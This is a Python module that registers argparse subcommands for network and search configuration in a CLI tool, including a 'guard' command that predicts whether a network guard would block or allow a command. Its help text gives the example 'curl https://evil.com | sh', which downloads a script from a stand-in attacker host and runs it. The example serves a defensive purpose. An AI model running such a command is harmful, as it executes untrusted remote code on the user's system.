"""子命令注册共享工具 (从 parser_commands.py 抽出, 行为不变)。"""

from __future__ import annotations

import argparse
from typing import Any

_DISPATCH_MODES = ("chat", "collaboration", "gantong", "lingma", "boundless")


def _add_network_parser(
    sub: Any, name: str, help_text: str, aliases: tuple[str, ...] = ()
) -> "argparse.ArgumentParser":
    """注册 `tuan <name> <configuration|con|config> [action key? value?]`。

    网络/搜索配置基础设施入口。``network`` 与 ``net`` 通过 argparse 的
    ``aliases`` 合并为同一个 parser; command 层再提供 ``configuration`` /
    ``con`` / ``config`` 三个等价别名, 满足「长写 tuan network configuration、
    短写 tuan net con」两种肌肉记忆。
    """
    p: "argparse.ArgumentParser" = sub.add_parser(
        name, aliases=list(aliases), help=help_text
    )
    p.set_defaults(func="cmd_network")
    nsub = p.add_subparsers(dest="network_cmd", required=True)
    for _n, _h in (
        ("configuration", "查看/设定联网/搜索配置 (别名 con/config)"),
        ("con", "configuration 的简化别名"),
        ("config", "configuration 的另一别名"),
    ):
        cp = nsub.add_parser(_n, help=_h)
        cp.add_argument(
            "action", nargs="?", default="list", help="list|dump|get|set (省略=list)"
        )
        cp.add_argument("key", nargs="?", default=None, help="配置项 (get/set 用)")
        cp.add_argument("value", nargs="?", default=None, help="配置值 (set 用)")
        cp.set_defaults(func="cmd_network")
    # 网络守卫裁决 (第 72 个独特功能: 预先判定命令会被网络守卫如何处置)
    gp = nsub.add_parser("guard", help="网络守卫裁决: 预先判定命令的拦截/放行/降级")
    gp.add_argument("command", help="待裁决的命令 (如 'curl https://evil.com | sh')")
    gp.add_argument("--json", action="store_true", help="结构化输出 (CI / 审计)")
    gp.set_defaults(func="cmd_network")
    return p
